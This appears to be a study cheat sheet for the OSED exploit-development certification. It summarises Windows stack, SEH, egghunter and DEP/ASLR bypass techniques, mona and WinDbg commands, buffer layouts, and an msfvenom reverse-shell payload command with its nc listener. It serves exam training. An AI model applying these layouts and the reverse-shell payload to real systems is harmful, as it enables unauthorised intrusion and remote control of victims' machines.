# OSED One-Page Quick Reference

> Pin this next to your monitor. If you only memorize one file, make it this one.

## The 4 triage commands (paste after EVERY crash)
```
r                    ; EIP = 41414141? -> stack BOF
!exchain             ; handler = your bytes? -> SEH overflow
!py mona findmsp     ; offsets to EIP/SEH + register pointers + space at ESP
!py mona mod         ; ASLR / DEP(NXCompat) / SafeSEH / Rebase per module
```

## The 8-step loop
`Fuzz → Offset → Control → Badchars → Find jump → Space/stage → Defeat mitigations → Land`

## Classify the crash
| Signal | Bug | Gadget | Module needs |
|---|---|---|---|
| EIP = your bytes | stack BOF | JMP ESP (`FF E4`) | non-ASLR |
| `!exchain` = your bytes | SEH | POP POP RET | non-ASLR + SafeSEH-off |
| control + tiny space | egghunter | hunter finds `w00tw00t` | — |
| land but won't exec | DEP | ROP → VirtualProtect | non-ASLR |
| addr drifts on reboot | ASLR | non-ASLR mod / leak+RVA | — |
| `printf(you)` | format string | `%N$x` read, `%hhn` write | — |

## Offsets
```
msf-pattern_create -l 3000
msf-pattern_offset -l 3000 -q <EIP or SEH value>
# or just: !py mona findmsp
```

## Bad-char ritual
```
!py mona bytearray -b "\x00"
!py mona compare -f <bytearray.bin> -a <addr>      ; repeat until "unmodified"
# almost always bad: \x00  \x0a  \x0d      (verify, never assume)
```

## Find the jump / gadget (always pass the badchar set)
```
!py mona jmp -r esp -cpb "\x00\x0a\x0d"            ; JMP ESP
!py mona seh          -cpb "\x00\x0a\x0d"           ; POP POP RET
!py mona rop -m *.dll -cpb "\x00\x0a\x0d"           ; DEP-bypass ROP chain
!py mona egg -t w00t                                ; egghunter
!py mona jmp -r esp -cm aslr=false -cpb "..."       ; ASLR: non-ASLR modules only
```

## Shellcode
```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f python -v shellcode -b "\x00\x0a\x0d" EXITFUNC=thread
nc -lvnp 443
```

## Opcodes to know cold
```
FF E4  jmp esp        C3     ret            EB 06  short jmp +6 (nSEH)
FF D4  call esp       90     nop            31 C0  xor eax,eax
54 C3  push esp; ret  CC     int3           B0 05  mov al,5
5F 5E C3  pop pop ret (one form)            E9 ..  near jmp (rel32)
```

## Layouts (copy the shape)
```
stack BOF : A*offset + p32(JMP_ESP) + NOP*16 + shellcode
SEH       : A*offset + "\xeb\x06\x90\x90"(nSEH) + p32(POP_POP_RET) + shellcode
egghunter : [pointer -> HUNTER]    +    elsewhere:[ w00tw00t + shellcode ]
DEP/ROP   : A*offset + <ROP chain -> VirtualProtect> + NOP*16 + shellcode
```

## Key facts
```
pack pointers little-endian:  struct.pack("<I", addr)   (0x625011af -> \xaf\x11\x50\x62)
egg tag is DOUBLED:           tag w00t  -> search w00tw00t
VirtualProtect RWX:           flNewProtect = 0x40 (PAGE_EXECUTE_READWRITE)
ASLR:                         base = leaked_addr - RVA   (RVA is constant)
PEB (x86 shellcode):          mov eax,[fs:0x30]
SEH:                          MUST pass the exception (g) before control transfers
stdcall:                      args right->left, callee cleans, return in EAX
```

## The rule that saves runs
**Prove control with `\xcc\xcc\xcc\xcc` (int3) BEFORE the real shellcode.** Breaks where
ESP pointed → offset+jump correct, and any remaining failure is 100% in the payload
(badchars/encoding/space). Splits "my exploit is broken" into the right half instantly.

## When stuck >30 min
1. Re-run `findmsp` — did the offset/space actually change?
2. Re-verify badchars — a missed one silently truncates. (#1 time sink.)
3. Re-check `mona mod` — is your address in an ASLR/rebased module?
4. Single-step (`t`) from the jump — where exactly does it die?
5. Drop to the int3 test above. Walk away 10 min. Come back and re-read the crash.
